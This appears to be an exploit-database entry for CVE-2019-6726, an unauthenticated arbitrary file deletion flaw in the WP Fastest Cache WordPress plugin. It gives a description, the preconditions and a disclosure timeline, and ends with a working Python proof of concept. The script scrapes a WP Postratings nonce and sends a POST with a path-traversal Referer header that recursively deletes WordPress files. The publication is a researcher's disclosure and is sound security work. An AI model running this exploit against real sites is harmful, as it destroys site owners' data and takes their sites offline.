@@ -1,0 +1,90 @@
+id: 32342
+date: 03/12/2019
+title: WordPress Fastest Cache 0.8.9.0 Arbitrary File Deletion Exploit
+author: Sebastian Neef
+cves: CVE-2019-6726
+
+The wordpress plugin "WP Fastest Cache" [0] suffered from an arbitrary file deletion bug. 
+
+# Description
+
+A successful attack allows an unauthenticated attacker to specify a path to a directory from which files and directories will be deleted recursively. The vulnerable code path extracts the path portion of the referrer header and then uses string concatenation to build an absolute path. This path is then passed to the 'rm_folder_recursively' function which deletes folders and their files in a recursive manner. 
+
+Although a successful exploit leads to data loss and potentially a DoS against the website, because wordpress won't find important files to run, there are several requirements which need to be met:
+
+- WP Fastest Cache is installed and the cache is activated
+- Wordpress is configured to use 'pretty' URL schemes, like /<data>/<title> etc.
+- WP Postratings [1] is installed
+- At least one ratable post or page was published
+
+# PoC / Exploit
+
+A proof of concept and ready-to-use python exploit script exists at [2], but is in general as simple as finding a ratable post/page, extracting the nonce and sending a POST request with the malicious referrer header. 
+
+# Timeline
+- 24.01.2019: Reported the vulnerability to the vendor
+- 24.01.2019: CVE-2019-6726 assigned by MITRE
+- 29.01.2019: Finished communication about possible fixes
+- 17.02.2019: Vendor released fixed version
+- 09.03.2019: Details published
+
+Best,
+Sebastian Neef
+https://0day.work
+
+[0] https://vi.wordpress.org/plugins/wp-fastest-cache/
+[1] https://vi.wordpress.org/plugins/wp-postratings/
+[2] https://0day.work/cve-2019-6726-arbitrary-file-deletion-in-wp-fastest-cache-0-8-8-1/
+
+
+Proof of Concept
+
+Here's a very basic PoC that will do the following:
+
+    Fetch the source code of the target URL
+    Parse out the nonce needed to post a rating
+    Post a rating for the given post using a malicious referrer
+    Thereby deleting important wordpress files and demonstrating the vulnerability.
+
+
+#!/usr/bin/python
+# PoC for CVE-2019-6726 by @gehaxelt
+
+import requests
+from bs4 import BeautifulSoup
+#from requests.auth import HTTPBasicAuth
+
+# The vulnerable page with a ratable post
+BASE_URL = "http://localhost:7349/"
+VOTE_PAGE = "rate-my-bobby-car-and-again/"
+RATINGS_POST_OR_PAGE = "{}{}".format(BASE_URL, VOTE_PAGE) 
+
+# Send initial request to obtain nonce!
+r = requests.get(RATINGS_POST_OR_PAGE)
+
+# Parse returned HTML
+bs = BeautifulSoup(r.content, "html5lib")
+
+# Find span that has the nonce!
+the_span = bs.find_all('span', attrs={'data-nonce' : True})[0]
+nonce = the_span['data-nonce']
+pid = the_span['id'].replace("post-ratings-", "")
+print("the nonce is: ", nonce)
+print("the pid is: ", pid)
+
+burp0_url = "{}wp-admin/admin-ajax.php".format(BASE_URL)
+burp0_headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0", 
+    "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Referer": "{}../../../".format(BASE_URL), 
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
+    "X-Requested-With": "XMLHttpRequest", 
+    "DNT": "1", 
+    "Connection": "close",
+    }
+burp0_data={"action": "postratings", "pid": pid, "rate": "5", "postratings_{}_nonce".format(pid): nonce}
+r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+print("Response is: ", r.status_code)
+
+#  0day.today [2023-03-21]  #
